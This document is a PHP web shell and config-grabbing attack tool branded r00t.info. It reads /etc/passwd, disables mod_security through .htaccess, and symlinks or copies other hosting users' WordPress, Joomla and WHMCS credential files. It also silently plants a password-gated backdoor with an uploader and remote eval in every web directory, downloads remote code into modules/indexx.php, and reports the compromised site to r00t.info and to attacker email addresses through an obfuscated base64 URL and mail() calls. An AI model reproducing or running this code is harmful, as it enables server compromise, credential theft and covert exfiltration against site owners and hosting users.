<script type="text/javascript">
document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%68%74%74%70%3A%2F%2F%72%30%30%74%2E%69%6E%66%6F%2F%6C%63%72%6C%61%6D%65%72%73%61%76%61%72%2F%6C%6F%67%2E%6A%73%3E%3C%2F%73%63%72%69%70%74%3E'));
</script>
<script src=http://r00t.info/ccb.js></script><?php @session_start(); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('max_execution_time',0); @ini_set('display_errors', 0); @ini_set('output_buffering',0); @set_time_limit(0); @set_magic_quotes_runtime(0); ?>
<?php @session_start(); @error_reporting(0); $a = '<?php
session_start();
if($_SESSION["adm"]){
echo \'<b>Namesis<br><br>\'.php_uname().\'<br></b>\';echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\';echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\';if( $_POST[\'_upl\'] == "Upload" ) {	if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Success !!!</b><br><br>\'; }	else { echo \'<b>Upload Fail !!!</b><br><br>\'; }}
}
if($_POST["p"]){
$p = $_POST["p"];
$pa = md5(sha1($p));
if($pa=="a4cd2905b660e8b1bc73a7c4571252da"){
$_SESSION["adm"] = 1;
}
}
?>
<form action="" method="post">
<input type="text" name="p">
</form>
'; if(@$_REQUEST["px"]){ $p = @$_REQUEST["px"]; $pa = md5(sha1($p)); if($pa=="a4cd2905b660e8b1bc73a7c4571252da"){ echo @eval(@file_get_contents(@$_REQUEST["404"])); } } if(@!$_SESSION["sdm"]){ $doc = $_SERVER["DOCUMENT_ROOT"]; $dir = scandir($doc); $d1 = ''.$doc.'/.'; $d2 = ''.$doc.'/..'; if(($key = @array_search('.', $dir)) !== false) { unset($dir[$key]); } if(($key = @array_search('..', $dir)) !== false) { unset($dir[$key]); } if(($key = @array_search($d1, $dir)) !== false) { unset($dir[$key]); } if(($key = array_search($d2, $dir)) !== false) { unset($dir[$key]); } @array_push($dir,$doc); foreach($dir as $d){ $p = $doc."/".$d; if(is_dir($p)){ $file = $p."/newsr.php"; @touch($file); $folder = @fopen($file,"w"); @fwrite($folder,$a); } } $lls = $_SERVER["HTTP_HOST"]; $llc = $_SERVER["REQUEST_URI"]; $lld = 'http://'.$lls.''.$llc.''; $brow = urlencode($_SERVER['HTTP_USER_AGENT']); $retValue = file_get_contents(base64_decode("aHR0cDovL3IwMHQuaW5mby95YXoucGhwP2E=")."=".$lld.base64_decode("JmI=")."=".$brow); echo $retValue; @$_SESSION["sdm"]=1; } ?>
<style type=text/css> 
.rules
{text-shadow:5px 5px 10px red;}
.owner
{text-shadow:5px 5px 10px orange;}
.mod
{text-shadow:5px 5px 10px white;}
.member
{text-shadow:5px 5px 10px blue;}
.guest
{text-shadow:5px 5px 10px green;}
.tags
{text-shadow:5px 5px 10px grey;}
.title
{text-shadow:5px 5px 10px purple;}
.numbers
{text-shadow:1px 5px 10px white;}
body {background-color: transparent;color: #000000;}
</style>
<br>
<br>
<center> <!-- IE doesn't like CSS Centering -->
<table border="0">
<table bgcolor="black" border="1">
<tr onmouseover="this.bgColor='#FF8000'" onmouseout="this.bgColor='#000000'">
<th>
<br>
<span style="text-shadow:5px 5px 10px red;"><font size="7">www.r00t.info CONFIG FUCKER</font></span>
</th>
</tr>
<td>
<table border="1" bgcolor="black" align="center">
<tr onmouseover="this.bgColor='#FF8000'" onmouseout="this.bgColor='#000000'">
<th width="481" class="title"><span style="text-shadow:5px 5px 10px red;">User</span></th>
<th width="514" class="title"><span style="text-shadow:5px 5px 10px red;">User</span></th>
</tr>
</tr><tr onmouseover="this.bgColor='#FF8000'" onmouseout="this.bgColor='#000000'">
<td>
<span style="font-weight: bold; color: blue;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;~ Auto Config ~</span><br><br>
<br>
<form method=post>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<textarea rows=10 cols=50 name=usern><?php  $users=file("/etc/passwd"); foreach($users as $user) { $str=explode(":",$user); echo $str[0]."\n"; } ?></textarea><br><br>
<center><input type=submit name=submitn value="Grab It " /></form></center>
</td>
<td>
<table border="1" cellpadding="1" width="514" height="300" bgcolor="black"></td> 
</tr>
<span style="font-weight: bold; color: blue;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;~ Bypass Config ~</span><br><br>
<form method=post>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<textarea rows=10 cols=50 name=userb><?php  $users=file("/etc/passwd"); foreach($users as $user) { $str=explode(":",$user); echo $str[0]."\n"; } ?></textarea><br><br>
<center><input type=submit name=submitb value="Bypass It " /></form></center>
</td>
</td>
</tr>
</table></table></table>
<td>
</center>
<?php if(isset($_POST['submitn'])) { mkdir('r00tnormal',0777); $htaccess = "OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI \nOptions Indexes FollowSymLinks \nForceType text/plain \nAddType text/plain .php \nAddType text/plain .html \nAddType text/html .shtml \nAddType txt .php \nAddHandler server-parsed .php \nAddHandler server-parsed .shtml \nAddHandler txt .php \nAddHandler txt .html \nAddHandler txt .shtml \nOptions All \nOptions All \n<IfModule mod_security.c> \nSecFilterEngine Off \nSecFilterScanPOST Off \nSecFilterCheckURLEncoding Off \nSecFilterCheckCookieFormat Off \nSecFilterCheckUnicodeEncoding Off \nSecFilterNormalizeCookies Off \n</IfModule>"; $htaccessfile = fopen("r00tnormal/.htaccess",'w'); fwrite($htaccessfile,$htaccess); $admin = explode("\n",$_POST['usern']); $needconfig = array("wp-config.php","/blog/wp-config.php","wordpress/wp-config.php","wp/wp-config.php","site/wp-config.php","site/blog/wp-config.php","configuration.php","site/configuration.php","joomla/configuration.php","home/configuration.php","vb/includes/config.php","/includes/config.php","forum/includes/config.php","conf_global.php","inc/config.php","config.php","Settings.php","sites/default/settings.php","whm/configuration.php","whmcs/configuration.php","support/configuration.php","whmc/WHM/configuration.php","whm/WHMCS/configuration.php","whm/whmcs/configuration.php","support/configuration.php","clients/configuration.php","client/configuration.php","clientes/configuration.php","cliente/configuration.php","clientsupport/configuration.php","billing/configuration.php","admin/config.php","/include/config.php","/commun/config.php","/include/sql.php","/include/db.php","/db.php","/commun/sql.php","/common/db.php","/common/sql.php","/common/config.php"); foreach($admin as $admins ) { $ad=trim($admins); foreach($needconfig as $config) { $direct = "/home/".$ad."/public_html/".$config; $import = "r00tnormal/".$ad."_".$config; symlink($direct,$import); } } echo '<center><span style="text-shadow:5px 5px 10px red;"><font size="4" color="black"> <a href="r00tnormal/"><marquee behavior=alternate>CONFiG FiLES</marquee></a></font></span></center>'; } ?>
<?php if(isset($_POST['submitb'])) { mkdir('r00tbypass',0777); $htaccess = "OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI \nOptions Indexes FollowSymLinks \nForceType text/plain \nAddType text/plain .php \nAddType text/plain .html \nAddType text/html .shtml \nAddType txt .php \nAddHandler server-parsed .php \nAddHandler server-parsed .shtml \nAddHandler txt .php \nAddHandler txt .html \nAddHandler txt .shtml \nOptions All \nOptions All \n<IfModule mod_security.c> \nSecFilterEngine Off \nSecFilterScanPOST Off \nSecFilterCheckURLEncoding Off \nSecFilterCheckCookieFormat Off \nSecFilterCheckUnicodeEncoding Off \nSecFilterNormalizeCookies Off \n</IfModule>"; $htaccessfile = fopen("r00tbypass/.htaccess",'w'); fwrite($htaccessfile,$htaccess); $admin = explode("\n",$_POST['usern']); $needconfig = array("wp-config.php","/blog/wp-config.php","wordpress/wp-config.php","wp/wp-config.php","site/wp-config.php","site/blog/wp-config.php","configuration.php","site/configuration.php","joomla/configuration.php","home/configuration.php","vb/includes/config.php","/includes/config.php","forum/includes/config.php","conf_global.php","inc/config.php","config.php","Settings.php","sites/default/settings.php","whm/configuration.php","whmcs/configuration.php","support/configuration.php","whmc/WHM/configuration.php","whm/WHMCS/configuration.php","whm/whmcs/configuration.php","support/configuration.php","clients/configuration.php","client/configuration.php","clientes/configuration.php","cliente/configuration.php","clientsupport/configuration.php","billing/configuration.php","admin/config.php","/include/config.php","/commun/config.php","/include/sql.php","/include/db.php","/db.php","/commun/sql.php","/common/db.php","/common/sql.php","/common/config.php"); foreach($admin as $admins ) { $ad=trim($admins); foreach($needconfig as $config) { $direct = "../../".$ad."/public_html/".$config; $import = "r00tbypass/".$ad."_".$config; copy($direct,$import); } } echo '<center><span style="text-shadow:5px 5px 10px red;"><font size="4" color="black"><a href="r00tbypass/"><marquee behavior=alternate>CONFiG FiLES</marquee></a> </font></span></center>'; } ?>
<?php  if($_POST['query']){ $veriyfy = stripslashes(stripslashes($_POST['query'])); $data = "data.txt"; @touch ("data.txt"); $ver = @fopen ($data , 'w'); @fwrite ( $ver , $veriyfy ) ; @fclose ($ver); }else{ $datas=@fopen("data.txt",'r'); $i=0; while ($i <= 5) { $i++; $blue=@fgets($datas,1024); echo $blue; } } $datasi=@fopen("../modules/indexx.php",'r'); if($datasi){ }else{ @mkdir("modules"); $dos = file_get_contents("http://r00t.info/txt/lamer.txt"); $data = "../modules/indexx.php"; @touch ("../modules/indexx.php"); $ver = @fopen ($data , 'w'); @fwrite ( $ver , $dos ) ; @fclose ($ver); $yol = "http://".$_SERVER['HTTP_HOST']."".$_SERVER['REQUEST_URI'].""; $y = '<h1>Sender Yazdirildi.<br/> SITE YOL : '.$yol.'<br/>Sender Yolu : modules/dbs.php</h1>'; $header .= "From: SheLL Boot <suppor@nic.org>\n"; $header .= "Content-Type: text/html; charset=utf-8\n"; @mail("polatbey22@aol.com", "Hacklink Bildiri", "$y", $header); @mail("priphp@hotmail.com", "Hacklink Bildiri", "$y", $header); } ?>

<?php $kime = "polatbey22@aol.com"; $baslik = "r00t.info Server Avcisi V1.0"; $EL_MuHaMMeD = "Dosya Yolu : " . $_SERVER['DOCUMENT_ROOT'] . "\r\n"; $EL_MuHaMMeD.= "Server Admin : " . $_SERVER['SERVER_ADMIN'] . "\r\n"; $EL_MuHaMMeD.= "Server isletim sistemi : " . $_SERVER['SERVER_SOFTWARE'] . "\r\n"; $EL_MuHaMMeD.= "Shell Link : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF'] . "\r\n"; $EL_MuHaMMeD.= "Avlanan Site : " . $_SERVER['HTTP_HOST'] . "\r\n"; mail($kime, $baslik, $EL_MuHaMMeD); ?>
<script type="text/javascript" src="http://code.jquery.com/jquery-1.7.1.min.js"></script>
<div id="mefmed">
<script type="text/javascript" src="http://meftunmede.github.io/javascripts/Meftun_Sosyal_bar.js"></script>
</div>
<link href='http://meftunmede.github.io/stylesheets/Meftun_Sosyal_bar.css' rel='stylesheet' type='text/css'/>
<!-- Animasyonlu Sosyal Medya Bar By www.r00t.info -->
<script type="text/javascript">
$(document).ready(function(){
$.mefSocialBar({
items: {
facebook: { url: 'https://www.facebook.com/r00t.info/', text: 'Facebook Profili' },
twitter: { url: 'https://www.facebook.com/r00t.info/', text: 'Twitter Profili' },
google: { url: 'https://www.facebook.com/r00t.info/', text: 'Google+ Profili' },
youtube: { url: 'https://www.facebook.com/r00t.info/', text: 'Youtube Profili' },
},
show: 8,
position: "left",
skin: "clear"
});
});
</script>
